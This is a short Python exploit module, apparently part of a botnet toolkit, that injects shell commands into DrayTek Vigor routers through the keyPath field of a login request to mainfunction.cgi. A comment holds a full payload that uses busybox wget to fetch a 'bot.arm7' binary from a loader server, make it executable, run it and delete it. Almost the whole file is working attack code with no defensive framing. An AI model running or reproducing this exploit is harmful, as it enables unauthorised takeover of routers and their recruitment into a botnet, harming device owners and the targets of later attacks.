#! python !#
from misc.session import *
import urllib.parse

def vigorrouter(ip, cmd, session):
    try:
        cookies = {
            'RebootType': '1',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
        }

        params = {
            'id': '415f51ba',
        }

        #encode command as url
        command = urllib.parse.quote_plus(cmd)
        command.replace(' ', '${IFS}')
        
        data = f'action=login&keyPath={command}&loginPwd=a&loginUser=a'
        
        session.post(f'http://{ip}/cgi-bin/mainfunction.cgi', headers=headers, data=data, timeout=5)
        return True
    except Exception as e: return (False, e)

# PoC example:
# Converted using
# https://curl.se/h2c/ - raw to curl
# https://curlconverter.com/ - curl to python
#
# request built from code below
#
# payload := "action=login&keyPath=%27%0A%09%2F"
# //payload = command just urlencoded
# payload += vigorPayload //"bin%2Fsh%24%7BIFS%7D-c%24%7BIFS%7D%27cd%24%7BIFS%7D%2Ftmp%24%7BIFS%7D%26%26%24%7BIFS%7Dbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F" + loaderDownloadServer + loaderBinsLocation + "bot.arm7%24%7BIFS%7D%26%26%24%7BIFS%7Dchmod%24%7BIFS%7D777%24%7BIFS%7Dbot.arm7%24%7BIFS%7D%26%26%24%7BIFS%7D.%2Fbot.arm7%24%7BIFS%7D" + loaderVigorTag + "%24%7BIFS%7D%26%26%24%7BIFS%7Drm%24%7BIFS%7D-rf%24%7BIFS%7Dbot.arm7"
# payload += "%27%0A%09%27&loginPwd=a&loginUser=a"
# cntlen := strconv.Itoa(len(payload))
# conn.Write([]byte("POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nContent-Length: " + cntlen + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\n" + payload + "\r\n\r\n"))
    